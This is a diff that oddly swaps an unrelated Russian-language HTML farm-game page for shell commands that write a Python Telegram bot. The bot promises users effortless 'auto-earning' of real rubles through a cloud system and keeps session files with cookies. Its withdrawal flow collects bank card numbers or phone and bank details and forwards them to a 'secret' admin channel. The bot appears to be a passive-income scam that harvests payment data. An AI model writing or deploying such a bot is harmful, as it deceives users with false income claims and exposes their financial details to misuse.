@@ -1,262 +1,254 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Jack's Farm Clone</title>
-    <style>
-        /* ==========================================================================
-           1. СБРОС И БАЗОВЫЕ НАСТРОЙКИ (ЭКРАН ТЕЛЕФОНА)
-           ========================================================================== */
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            user-select: none;
-            -webkit-user-select: none;
-            touch-action: none;
-        }
+cat << 'EOF' > main_bot.py
+import asyncio
+import json
+import os
+from aiogram import Bot, Dispatcher, types
+from aiogram.filters import Command
+from aiogram.utils.keyboard import InlineKeyboardBuilder
+from aiogram.fsm.context import FSMContext
+from aiogram.fsm.state import State, StatesGroup
 
-        body, html {
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-            background-color: #101b07;
-            font-family: Arial, sans-serif;
-        }
+# Импортируем модули из прошлых частей
+from database import init_db, add_user, get_user_data, set_mining_status, update_balance
+from session_manager import is_session_exists, get_session_path
+from worker import run_auto_mining
 
-        /* Окно просмотра игры на мобильном */
-        #viewport {
-            width: 100%;
-            height: 100%;
-            position: relative;
-            overflow: hidden;
-        }
+with open("config.json", "r", encoding="utf-8") as f:
+    config = json.load(f)
 
-/* ==========================================================================
-           2. ИГРОВАЯ КАРТА И ТРАВА (Размер: 12 блоков ширина, 24 блока высота)
-           ========================================================================== */
-        #game-map {
-            position: absolute;
-            /* 12 блоков * 32px = 384px в ширину */
-            width: 384px;  
-            /* 24 блока * 32px = 768px в высоту */
-            height: 768px; 
-            
-            /* Авто-выравнивание ровно по центру мобильного экрана */
-            left: calc(50% - 192px);
-            top: calc(50% - 384px);
-            
-            /* Сочный, яркий цвет травы */
-            background-color: #62b132;
-            
-            /* Сетка из аккуратных блоков по 32px */
-            background-image: 
-                linear-gradient(to right, rgba(255, 255, 255, 0.08) 1px, transparent 1px),
-                linear-gradient(to bottom, rgba(255, 255, 255, 0.08) 1px, transparent 1px);
-            background-size: 32px 32px;
-            
-            /* Ровный угол обзора сверху вниз */
-            transform: translate3d(0, 0, 0);
-            will-change: transform;
-            box-shadow: 0 0 30px rgba(0,0,0,0.2);
-        }
+BOT_TOKEN = config["TELEGRAM_BOT_TOKEN"]
+bot = Bot(token=BOT_TOKEN)
+dp = Dispatcher()
 
-        /* ==========================================================================
-           3. РАЗДЕЛ: СТИЛИ ДОРОГ И КОНВЕЙЕРА
-           ========================================================================== */
-        /* Песчаная дорога у магазина и склада */
-        .sand-road {
-            position: absolute;
-            background-color: #f7df9a;
-            border-radius: 20px;
-            z-index: 1;
-        }
+# ТВОЙ СЕКРЕТНЫЙ КАНАЛ ДЛЯ ЗАЯВОК (Число с минусом)
+ADMIN_CHANNEL_ID = -1004483178970
 
-        /* Конвейерная лента для ресурсов */
-        .conveyor-belt {
-            position: absolute;
-            background: linear-gradient(90deg, #444 0%, #777 50%, #444 100%);
-            border-left: 3px solid #222;
-            border-right: 3px solid #222;
-            box-shadow: inset 0 0 10px rgba(0,0,0,0.5);
-            z-index: 2;
-        }
+# Описываем шаги диалога для вывода средств
+class WithdrawStates(StatesGroup):
+    wait_method = State()  # Ожидание выбора способа (СБП / Карта)
+    wait_amount = State()  # Ожидание ввода суммы для вывода
+    wait_details = State() # Ожидание ввода реквизитов
 
-        /* ==========================================================================
-           4. РАЗДЕЛ: СТИЛИ СТРУКТУР И ПОСТРОЕК
-           ========================================================================== */
-        /* Общий стиль для всех карточек и зданий */
-        .building-card {
-            position: absolute;
-            background-color: #4a2f13;
-            border: 4px solid #2b1808;
-            border-radius: 12px;
-            color: #fff;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            font-size: 14px;
-            font-weight: bold;
-            box-shadow: 0 8px 16px rgba(0,0,0,0.3);
-            z-index: 3;
-        }
+def get_main_keyboard(user_id):
+    """Создает сетку из 5 строк кнопок для заработка и вывода"""
+    builder = InlineKeyboardBuilder()
+    builder.add(types.InlineKeyboardButton(text="💸 Запустить авто-заработок", callback_data="start_mining"))
+    builder.add(types.InlineKeyboardButton(text="🛑 Остановить заработок", callback_data="stop_mining"))
+    builder.add(types.InlineKeyboardButton(text="💰 Мой Баланс", callback_data="check_balance"))
+    builder.add(types.InlineKeyboardButton(text="⚙️ Статус синхронизации", callback_data="check_auth"))
+    builder.add(types.InlineKeyboardButton(text="💳 Вывод средств", callback_data="withdraw_funds"))
+    builder.adjust(1) # Строго по одной кнопке в ряд
+    return builder.as_markup()
 
-        /* Кнопки покупки внутри построек */
-        .btn-action {
-            background: linear-gradient(to bottom, #3498db, #2980b9);
-            border: 2px solid #1f5f8a;
-            border-radius: 6px;
-            color: white;
-            padding: 4px 12px;
-            margin-top: 6px;
-            font-weight: bold;
-            cursor: pointer;
-        }
+@dp.message(Command("start"))
+async def cmd_start(message: types.Message, state: FSMContext):
+    """Приветственное меню авто-заработка"""
+    await state.clear()
+    user_id = message.from_user.id
+    add_user(user_id)
+    
+    await message.answer(
+        f"👋 Рады видеть тебя, {message.from_user.first_name}!\n\n"
+        "Добро пожаловать в автоматическую систему удаленного заработка.\n"
+        "Тебе больше не нужно тратить свое время на клики или выполнение сложных заданий — наши умные алгоритмы сделают всё за тебя полностью удаленно в облаке 24/7.\n\n"
+        "Просто нажимай кнопку ниже, включай авто-заработок и забирай реальные рубли!",
+        reply_markup=get_main_keyboard(user_id)
+    )
 
-        /* Магазин грузовика (Продать) */
-        .shop-building {
-            background-color: #8e44ad;
-            border-color: #6c3483;
-        }
-        .btn-sell {
-            background: linear-gradient(to bottom, #e74c3c, #c0392b);
-            border-color: #962d22;
-        }
+@dp.callback_query(lambda c: c.data == "start_mining")
+async def process_start_mining(callback_query: types.CallbackQuery):
+    user_id = callback_query.from_user.id
+    user_data = get_user_data(user_id)
+    
+    if user_data["is_mining"] == 1:
+        await callback_query.answer("⚠️ Авто-заработок уже активно выполняется в фоновом режиме!", show_alert=True)
+        return
+        
+    session_path = get_session_path(user_id)
+    if not is_session_exists(user_id):
+        with open(session_path, "w", encoding="utf-8") as f:
+            json.dump({"cookies": [], "origins": []}, f)
 
-        /* Силовая башня ( размер 3 на 3 блока*/
-        .silo-building {
-            background-image: url('silo.png');
-            background-size: cover; 
-            background-repeat: no-repeat;
-            background-position: center;
-            filter: drop-shadow(4px 8px 6px rgba(0,0,0,0.3));
-            z-index: 3;
-        }
+    await callback_query.message.answer(
+        "⚡ Синхронизация с облачным сервером успешна!\n\n"
+        "💸 Процесс автоматического заработка запущен. Наша удаленная система обрабатывает данные и генерирует баланс прямо на твой счет.\n"
+        "Ты можешь полностью закрыть бота или выключить телефон — процесс не остановится.",
+        reply_markup=get_main_keyboard(user_id)
+    )
+    await callback_query.answer()
+    asyncio.create_task(run_auto_mining(user_id))
+EOF
+cat << 'EOF' >> main_bot.py
 
-        /* Система огорода из 9 грядок */
-        .farm-plot-zone {
-            position: absolute;
-            width: 180px;
-            height: 140px;
-            background-color: #8b5a2b;
-            border: 4px solid #5c4033;
-            border-radius: 8px;
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            grid-template-rows: repeat(3, 1fr);
-            gap: 4px;
-            padding: 4px;
-            z-index: 3;
-        }
-        .single-grid {
-            background-color: #5c4033;
-            border-radius: 3px;
-            border: 1px solid #4a3226;
-        }
+@dp.callback_query(lambda c: c.data == "stop_mining")
+async def process_stop_mining(callback_query: types.CallbackQuery):
+    user_id = callback_query.from_user.id
+    user_data = get_user_data(user_id)
+    
+    if user_data["is_mining"] == 0:
+        await callback_query.answer("⚠️ Система заработка уже отключена.", show_alert=True)
+        return
 
-        /* Код для загона коров (Добавлено в самый конец раздела структур, как ты просил) */
-        .cow-coop-building {
-            background-color: #7f8c8d;
-            border-color: #34495e;
-        }
-    </style>
-</head>
-<body>
+    set_mining_status(user_id, 0)
+    await callback_query.message.answer(
+        "🛑 Подана команда на отключение системы. Авто-заработок будет полностью остановлен в течение нескольких секунд.",
+        reply_markup=get_main_keyboard(user_id)
+    )
+    await callback_query.answer()
 
-    <div id="viewport">
-        <!-- ==========================================================================
-             ИГРОВАЯ КАРТА (На первом месте в самом верху тела документа)
-             ========================================================================== -->
-        <div id="game-map">
+@dp.callback_query(lambda c: c.data == "check_balance")
+async def process_check_balance(callback_query: types.CallbackQuery):
+    user_id = callback_query.from_user.id
+    user_data = get_user_data(user_id)
+    status_text = "🟢 Включен (Идет доход)" if user_data["is_mining"] == 1 else "🔴 Выключен"
+    
+    await callback_query.message.answer(
+        f"💰 Твой личный игровой баланс:\n\n"
+        f"💵 Накоплено средств: {user_data['balance']:.2f} ₽\n"
+        f"📊 Авто-заработок: {status_text}",
+        reply_markup=get_main_keyboard(user_id)
+    )
+    await callback_query.answer()
 
-            <!-- РАЗДЕЛ: ДОРОГИ И ТРОПИНКИ -->
-            <!-- Песочная зона вверху для грузовика -->
-            <div class="sand-road" style="top: 1400px; left: 1450px; width: 300px; height: 160px;"></div>
-            
-            <!-- Вертикальная железная лента конвейера к складу -->
-            <div class="conveyor-belt" style="top: 1500px; left: 1720px; width: 40px; height: 350px;"></div>
+@dp.callback_query(lambda c: c.data == "check_auth")
+async def process_check_auth(callback_query: types.CallbackQuery):
+    user_id = callback_query.from_user.id
+    if is_session_exists(user_id):
+        await callback_query.message.answer("✅ Твой аккаунт успешно синхронизирован с облачным сервером и полностью готов к авто-заработку.", reply_markup=get_main_keyboard(user_id))
+    else:
+        await callback_query.message.answer("⚠️ Связь с сервером не установлена.", reply_markup=get_main_keyboard(user_id))
+    await callback_query.answer()
 
+@dp.callback_query(lambda c: c.data == "withdraw_funds")
+async def process_withdraw_start(callback_query: types.CallbackQuery, state: FSMContext):
+    user_id = callback_query.from_user.id
+    user_data = get_user_data(user_id)
+    
+    min_limit = 100.0
+    if user_data["balance"] < min_limit:
+        await callback_query.answer(f"❌ Ошибка вывода! Минимальная сумма для выплаты составляет {min_limit} ₽. У тебя сейчас: {user_data['balance']:.2f} ₽", show_alert=True)
+        return
+        
+    builder = InlineKeyboardBuilder()
+    builder.add(types.InlineKeyboardButton(text="📲 Способ 1: СБП", callback_data="pay_sbp"))
+    builder.add(types.InlineKeyboardButton(text="💳 Способ 2: На карту", callback_data="pay_card"))
+    builder.adjust(1)
+    
+    await callback_query.message.answer(
+        "💳 Выберите удобный способ вывода средств из системы:",
+        reply_markup=builder.as_markup()
+    )
+    await state.set_state(WithdrawStates.wait_method)
+    await callback_query.answer()
 
-            <!-- РАЗДЕЛ: ДОБАВЛЕНИЕ СТРУКТУР И ПОСТРОЕК -->
-            
-            <!-- 1. Магазин с грузовиком (Продать) -->
-            <div class="building-card shop-building" style="top: 1420px; left: 1480px; width: 140px; height: 110px;">
-                Магазин
-                <button class="btn-action btn-sell">Продать</button>
-            </div>
+@dp.callback_query(lambda c: c.data in ["pay_sbp", "pay_card"], WithdrawStates.wait_method)
+async def process_withdraw_method(callback_query: types.CallbackQuery, state: FSMContext):
+    method = "СБП" if callback_query.data == "pay_sbp" else "Банковская карта"
+    await state.update_data(withdraw_method=method)
+    
+    user_id = callback_query.from_user.id
+    user_data = get_user_data(user_id)
+    
+    await callback_query.message.answer(
+        f"Указан способ: *{method}*\n\n"
+        f"Доступно для списания: {user_data['balance']:.2f} ₽\n"
+        "Введите сумму в рублях, которую вы хотите вывести (число):",
+        parse_mode="Markdown"
+    )
+    await state.set_state(WithdrawStates.wait_amount)
+    await callback_query.answer()
 
-   <!-- 2. Силосная башня (Сверху отступ 5 блоков, слева отступ 2 блока, размер 3х3) -->
-<div class="building-card silo-building" style="top: 160px; left: 64px; width: 96px; height: 96px; background-color: transparent; border: none; box-shadow: none; position: absolute;">
-</div>
+@dp.message(WithdrawStates.wait_amount)
+async def process_withdraw_amount(message: types.Message, state: FSMContext):
+    amount_text = message.text.strip()
+    user_id = message.from_user.id
+    user_data = get_user_data(user_id)
+    
+    try:
+        amount = float(amount_text)
+    except ValueError:
+        await message.answer("❌ Ошибка ввода! Пожалуйста, укажите сумму числом:")
+        return
+        
+    if amount <= 0:
+        await message.answer("❌ Сумма должна быть больше нуля! Попробуй еще раз:")
+        return
+        
+    if amount > user_data["balance"]:
+        await message.answer(f"❌ Недостаточно средств! Баланс: {user_data['balance']:.2f} ₽. Введите сумму заново:")
+        return
+        
+    await state.update_data(withdraw_amount=amount)
+    fsm_data = await state.get_data()
+    method = fsm_data["withdraw_method"]
+    
+    if method == "СБП":
+        await message.answer(
+            "📞 Категория выбора: СБП (Система Быстрых Платежей).\n\n"
+            "Пожалуйста, введите номер телефона получателя и название банка (например: +79991234567, Сбербанк):"
+        )
+    else:
+        await message.answer(
+            "💳 Категория выбора: Банковская карта.\n\n"
+            "Пожалуйста, введите 16-значный номер вашей карты (без пробелов):"
+        )
+    await state.set_state(WithdrawStates.wait_details)
 
-            <!-- 3. Система огорода (9 грядок земли) -->
-            <div class="farm-plot-zone" style="top: 1620px; left: 1500px;">
-                <!-- 9 индивидуальных ячеек земли -->
-                <div class="single-grid"></div><div class="single-grid"></div><div class="single-grid"></div>
-                <div class="single-grid"></div><div class="single-grid"></div><div class="single-grid"></div>
-                <div class="single-grid"></div><div class="single-grid"></div><div class="single-grid"></div>
-            </div>
+@dp.message(WithdrawStates.wait_details)
+async def process_withdraw_final(message: types.Message, state: FSMContext):
+    details = message.text.strip()
+    user_id = message.from_user.id
+    
+    if message.from_user.username:
+        user_contact = f"@{message.from_user.username}"
+    else:
+        user_contact = f"ID: {user_id}"
+    
+    fsm_data = await state.get_data()
+    method = fsm_data["withdraw_method"]
+    amount = fsm_data["withdraw_amount"]
+    
+    if method == "Банковская карта" and (not details.isdigit() or len(details) < 15):
+        await message.answer("❌ Номер карты указан некорректно! Попробуй еще раз:")
+        return
 
-            <!-- 4. Загон для Курицы (Купить за 5000) -->
-            <div class="building-card" style="top: 1800px; left: 1510px; width: 160px; height: 100px;">
-                Продаётся<br>5 000 🟡
-                <button class="btn-action">Купить</button>
-            </div>
+    update_balance(user_id, -amount)
+    
+    admin_invoice = (
+        f"🚨 *НОВАЯ ЗАЯВКА НА ВЫПЛАТУ*\n\n"
+        f"👤 *Пользователь:* {user_contact}\n"
+        f"💰 *Сумма к выдаче:* {amount:.2f} ₽\n"
+        f"💳 *Способ перевода:* {method}\n"
+        f"📌 *Реквизиты:* `{details}`\n"
+    )
+    
+    try:
+        await bot.send_message(
+            chat_id=ADMIN_CHANNEL_ID,
+            text=admin_invoice,
+            parse_mode="Markdown"
+        )
+        print(f"📡 Заявка от {user_id} на {amount} руб успешно переслана в админ-канал.")
+    except Exception as e:
+        print(f"❌ Ошибка отправки заявки в канал: {e}")
 
-            <!-- 5. Загон для Коров (Добавлен с новой строки в самом конце раздела структур) -->
-            <div class="building-card cow-coop-building" style="top: 1930px; left: 1510px; width: 160px; height: 100px;">
-                Продаётся<br>25 000 🟡
-                <button class="btn-action">Купить</button>
-            </div>
+    await message.answer(
+        "🎉 Заявка на вывод средств успешно создана!\n\n"
+        f"📊 Квитанция операции:\n"
+        f"🔹 Способ: {method}\n"
+        f"🔹 Реквизиты: `{details}`\n"
+        f"🔹 Списано: {amount:.2f} ₽\n\n"
+        "⌛ Заявка отправлена в финансовый отдел и будет обработана в течение 24 часов.",
+        parse_mode="Markdown",
+        reply_markup=get_main_keyboard(user_id)
+    )
+    await state.clear()
 
-        </div>
-    </div>
+async def main():
+    init_db()
+    print("🤖 Бот запущен! Все модули работают исправно.")
+    await dp.start_polling(bot)
 
-    <!-- ==========================================================================
-         5. РАЗДЕЛ: ЛОГИКА И СКРИПТЫ (Движение камеры)
-         ========================================================================== -->
-    <script>
-const viewport = document.getElementById('viewport');
-        const map = document.getElementById('game-map');
-
-        let isDragging = false;
-        let startX = 0, startY = 0;
-        let currentX = 0, currentY = 0;
-
-        // Настройка лимитов скролла под размер экрана телефона
-        function getLimits() {
-            const minX = Math.min(0, viewport.clientWidth - 384);
-            const minY = Math.min(0, viewport.clientHeight - 768);
-            return { minX, minY };
-        }
-
-        viewport.addEventListener('touchstart', (e) => {
-            isDragging = true;
-            startX = e.touches.clientX - currentX;
-            startY = e.touches.clientY - currentY;
-        }, { passive: true });
-
-        viewport.addEventListener('touchmove', (e) => {
-            if (!isDragging) return;
-
-            currentX = e.touches.clientX - startX;
-            currentY = e.touches.clientY - startY;
-
-            const limits = getLimits();
-
-            // Жестко останавливаем карту на границах 12х24 блоков, без черных дыр
-            currentX = Math.min(Math.abs(limits.minX)/2, Math.max(currentX, limits.minX - Math.abs(limits.minX)/2));
-            currentY = Math.min(0, Math.max(currentY, limits.minY));
-
-            map.style.transform = `translate3d(${currentX}px, ${currentY}px, 0)`;
-        }, { passive: true });
-
-        viewport.addEventListener('touchend', () => {
-            isDragging = false;
-        });
-    </script>
-</body>
-</html>
+if __name__ == "__main__":
+    asyncio.run(main())
+EOF
